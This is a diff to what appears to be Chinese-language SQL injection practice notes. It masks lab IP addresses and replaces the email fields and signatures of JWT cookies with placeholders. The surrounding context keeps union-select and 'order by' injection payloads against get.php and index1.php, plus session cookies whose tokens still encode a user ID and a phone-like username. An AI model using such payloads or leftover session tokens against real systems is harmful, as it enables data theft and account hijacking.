@@ -883,7 +883,7 @@ http://113.45.183.x:22388/index1.php?uname=aaa'union select 1,2,group_concat(col
 
 ![image-20240902181433-dh7juzq](assets/image-20240902181433-dh7juzq.png)
 
-# [Get Inject](http://113.45.183.4:38544/get.php?id=1)
+# [Get Inject](http://113.45.183.x:38544/get.php?id=1)
 
 http://113.45.183.x:45962/get.php?id=1'order by 4--+     字段数为3
 
@@ -936,12 +936,12 @@ Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
 Accept-Encoding: gzip, deflate, br
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 30
-Origin: http://113.45.183.4:38544
+Origin: http://113.45.183.x:38544
 DNT: 1
 Sec-GPC: 1
 Connection: close
-Referer: http://113.45.183.4:38544/ua.php
-Cookie: vue_admin_template_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoyMSwidXNlcm5hbWUiOiIxODc2MDg3NzIwOCIsImV4cCI6MTcyNTM0NDg3NiwiZW1haWwiOiJ5b3V6ZTI3QG91dGxvb2suY29tIn0.9mB9wZ9k4CA77RGqWxPtpWgF8LVFfmUGP68teio7ul4; JSESSIONID=7d026acd-57a2-4b07-860a-ce628120e112; PHPSESSID=lb61ndu0b64v6tieh37r233947
+Referer: http://113.45.183.x:38544/ua.php
+Cookie: vue_admin_template_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoyMSwidXNlcm5hbWUiOiIxODc2MDg3NzIwOCIsImV4cCI6MTcyNTM0NDg3NiwiZW1haWwiOiJwbGFjZWhvbGRlckBleGFtcGxlLmNvbSJ9.xxx; JSESSIONID=7d026acd-57a2-4b07-860a-ce628120e112; PHPSESSID=lb61ndu0b64v6tieh37r233947
 Upgrade-Insecure-Requests: 1
 Priority: u=0, i
 
@@ -962,7 +962,7 @@ DNT: 1
 Sec-GPC: 1
 Connection: close
 Referer: http://192.168.100.40:18464/ua.php
-Cookie: vue_admin_template_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoyMywidXNlcm5hbWUiOiJ6aGFuZ3lvdXplIiwiZXhwIjoxNzI1MzY1MDExLCJlbWFpbCI6InpoYW5neW91emUifQ.7jK0DTiWdUk_3Ys_EhZ_RrMPG1qyyAlphkv4wruHQtY
+Cookie: vue_admin_template_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoyMywidXNlcm5hbWUiOiJ6aGFuZ3lvdXplIiwiZXhwIjoxNzI1MzY1MDExLCJlbWFpbCI6InBsYWNlaG9sZGVyQGV4YW1wbGUuY29tIn0.xxx
 Upgrade-Insecure-Requests: 1
 Priority: u=0, i
 
